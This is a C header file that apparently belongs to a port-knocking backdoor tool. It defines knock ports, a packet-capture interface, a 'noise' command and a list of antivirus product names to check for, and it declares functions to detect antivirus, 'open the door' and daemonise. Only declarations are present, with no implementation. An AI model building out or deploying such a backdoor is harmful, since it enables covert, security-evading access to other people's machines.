#ifndef UTILS_H
#define UTILS_H

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <ifaddrs.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <netdb.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/wait.h>
#include <pcap.h>
#include <net/bpf.h>
#include <signal.h>

#define IP_VERSION AF_INET
#define IPV4_LOOPBACK_ADDR "127.0.0.1"
#define IPV6_LOOPBACK_ADDR "::1"
#define CDR_NOISE_COMMAND "noi"
#define CDR_PORTS { 20000,40000,31618,32102,39000,44223,23876,28521,00 }
#define	CDR_BPF_PORT "port "
#define CDR_BPF_ORCON " or "
#define CDR_INTERFACE "wlp41s0"
#define CAPLENGTH	98
#define ETHLENGTH 	14
#define IP_MIN_LENGTH 	20

const char* KNOWN_AV_LIST[] = {"XProtect", "avast", "avg", "kaspersky", "defender"};
const int KNOWN_AV_NUM = 5;

struct iphdr {
        u_char  ihl:4,        /* header length */
        version:4;              /* version */
        u_char  tos;          /* type of service */
        short   tot_len;      /* total length */
        u_short id;           /* identification */
        short   off;          /* fragment offset field */
        u_char  ttl;          /* time to live */
        u_char  protocol;     /* protocol */
        u_short check;        /* checksum */
        struct  in_addr saddr;
	struct  in_addr daddr;  /* source and dest address */
};

struct tcphdr {
        unsigned short int 	src_port;
	unsigned short int 	dest_port;
        unsigned long int 	seq_num;
        unsigned long int 	ack_num;
	unsigned short int	rawflags;
        unsigned short int 	window;
        long int 		crc_a_urgent;
        long int 		options_a_padding;
};

void capterror(pcap_t *caps, char *message);

void signal_handler(int sig);

void *smalloc(size_t size);

void check_for_correct_ip(char *ip);

void check_for_antivirus();

void cdr_open_door();

void create_deamon_process(char *cdr_noise_command);

#endif